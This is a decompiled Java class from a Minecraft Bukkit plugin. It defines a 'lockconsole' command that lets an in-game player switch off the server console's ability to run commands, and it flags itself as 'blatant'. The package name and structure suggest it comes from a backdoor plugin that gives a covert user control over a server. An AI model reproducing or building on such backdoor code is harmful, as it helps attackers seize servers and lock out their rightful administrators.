/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class LockconsoleCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.isLocked) {
            plugin.isLocked = false;
            p2.sendMessage(Settings.PREFIX("Console can now execute commands."));
        } else {
            plugin.isLocked = true;
            p2.sendMessage(Settings.PREFIX("Console can no longer execute commands."));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

